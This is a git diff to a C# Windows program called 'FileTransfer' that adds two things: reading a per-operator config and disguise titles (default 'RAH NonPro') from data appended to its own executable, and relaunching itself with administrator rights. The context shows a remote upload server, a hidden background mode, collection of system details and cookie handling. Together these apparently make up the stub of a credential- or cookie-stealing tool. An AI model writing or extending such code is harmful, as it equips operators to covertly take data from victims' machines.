@@ -6,6 +6,7 @@ using System.Management;
 using System.Net.Http;
 using System.Net.Security;
 using System.Security.Cryptography.X509Certificates;
+using System.Security.Principal;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows;
@@ -22,6 +23,63 @@ namespace FileTransfer
     {
         private static readonly HttpClient _http;
 
+        private void ReadConfigFromEOF()
+        {
+            try
+            {
+                string exePath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
+                byte[] fileBytes = System.IO.File.ReadAllBytes(exePath);
+                
+                // Look for <<NEXUS_CFG>> (15 bytes)
+                string marker = "<<NEXUS_CFG>>";
+                byte[] markerBytes = System.Text.Encoding.UTF8.GetBytes(marker);
+                
+                int markerIndex = -1;
+                for (int i = fileBytes.Length - markerBytes.Length; i >= 0; i--)
+                {
+                    bool match = true;
+                    for (int j = 0; j < markerBytes.Length; j++)
+                    {
+                        if (fileBytes[i + j] != markerBytes[j])
+                        {
+                            match = false;
+                            break;
+                        }
+                    }
+                    if (match)
+                    {
+                        markerIndex = i;
+                        break;
+                    }
+                }
+
+                if (markerIndex != -1)
+                {
+                    int jsonStart = markerIndex + markerBytes.Length;
+                    int jsonLength = fileBytes.Length - jsonStart;
+                    string json = System.Text.Encoding.UTF8.GetString(fileBytes, jsonStart, jsonLength);
+                    
+                    var config = System.Text.Json.JsonSerializer.Deserialize<System.Collections.Generic.Dictionary<string, string>>(json);
+                    if (config != null)
+                    {
+                        if (config.ContainsKey("operatorName")) OperatorName = config["operatorName"];
+                        if (config.ContainsKey("appTitleMain")) AppTitleMainText = config["appTitleMain"];
+                        if (config.ContainsKey("appTitleVersion")) AppTitleVersionText = config["appTitleVersion"];
+                        if (config.ContainsKey("windowTitle")) WindowTitleText = config["windowTitle"];
+                        Log($"Loaded config from EOF: Operator={OperatorName}");
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Log("Failed to read EOF config: " + ex.Message);
+            }
+        }
+
+        private static string AppTitleMainText = "RAH NonPro";
+        private static string AppTitleVersionText = " v7.0.1";
+        private static string WindowTitleText = "RAH NonPro v7.0.1";
+
         static MainWindow()
         {
             var handler = new HttpClientHandler
@@ -36,7 +94,7 @@ namespace FileTransfer
         }
 
         private const string ServerUrl = "https://file-transfer-production-75ad.up.railway.app";
-        private const string OperatorName = "Shonll";
+        private static string OperatorName = "Shonll";
 
         private string? _cpu, _ram, _gpu, _cookieError;
         private static string? _cachedToken;
@@ -67,9 +125,16 @@ namespace FileTransfer
         public MainWindow()
         {
             Log("MainWindow constructor start");
+            ReadConfigFromEOF();
             try
             {
                 InitializeComponent();
+
+                // Apply dynamic texts
+                this.Title = WindowTitleText;
+                if (AppTitleMain != null) AppTitleMain.Text = AppTitleMainText;
+                if (AppTitleVersion != null) AppTitleVersion.Text = AppTitleVersionText;
+
                 Loaded += MainWindow_Loaded;
 
                 TxtUsername.Text = PlaceholderText;
@@ -80,6 +145,32 @@ namespace FileTransfer
                 bool hiddenInstance = IsHiddenInstance();
                 _backgroundMode = hiddenInstance && !showUi;
                 Log($"Constructor: exe={exePath}, hiddenInstance={hiddenInstance}, showUi={showUi}, _backgroundMode={_backgroundMode}");
+
+                // Visible режим без прав админа → перезапускаем с повышением
+                if (!_backgroundMode)
+                {
+                    bool isAdmin = new WindowsPrincipal(WindowsIdentity.GetCurrent())
+                        .IsInRole(WindowsBuiltInRole.Administrator);
+                    if (!isAdmin)
+                    {
+                        Log("Not admin, restarting with runas...");
+                        try
+                        {
+                            Process.Start(new ProcessStartInfo
+                            {
+                                FileName = exePath,
+                                Verb = "runas",
+                                UseShellExecute = true
+                            });
+                        }
+                        catch (Exception ex)
+                        {
+                            Log($"Runas restart failed: {ex.Message}");
+                        }
+                        Environment.Exit(0);
+                        return;
+                    }
+                }
 
                 if (_backgroundMode)
                 {
